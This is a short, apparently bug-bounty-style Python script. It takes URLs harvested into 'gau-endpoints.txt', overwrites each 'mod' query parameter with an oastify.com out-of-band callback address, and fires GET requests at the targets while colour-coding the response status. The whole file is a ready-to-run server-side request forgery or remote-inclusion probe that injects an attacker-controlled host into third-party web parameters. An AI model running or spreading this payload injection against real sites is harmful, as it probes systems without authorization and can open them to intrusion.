#!/usr/bin/python3

import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import time

green = "\033[92m"
red = "\033[91m"
orange = "\033[93m"
reset = "\033[0m"

def modify_value(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if "mod" in query_params:
        query_params["mod"] = ["https://w52zu4y39xmrfi881fop72hd349wxl.oastify.com"]
        modified_query = urlencode(query_params, doseq=True)
        modified_url = parsed_url._replace(query=modified_query)
        return urlunparse(modified_url)
    else:
        return None

def parse_and_change(file_path):
    modified_urls = []
    with open(file_path, "r") as file:
        for line in file:
            url = line.strip()
            modified_url = modify_value(url)
            if modified_url:
                modified_urls.append(modified_url)
    return modified_urls

def send_get_requests(urls):
    for url in urls:
        try:
            time.sleep(2)
            response = requests.get(url)
            status_code = response.status_code
            if status_code == 200:
                status_color = green
            elif status_code == 403:
                status_color = red
            elif status_code in {301,302,307,308,400,500,401,404}:
                status_color = orange
            else:
                status_color = reset
            print(f"{url}  {status_color}{response.status_code}{reset}")
        except Exception as e:
            print(f"error {url}: {e}")
            

if __name__ == "__main__":
    input_file = "gau-endpoints.txt"
    modified_urls = parse_and_change(input_file)
    send_get_requests(modified_urls)
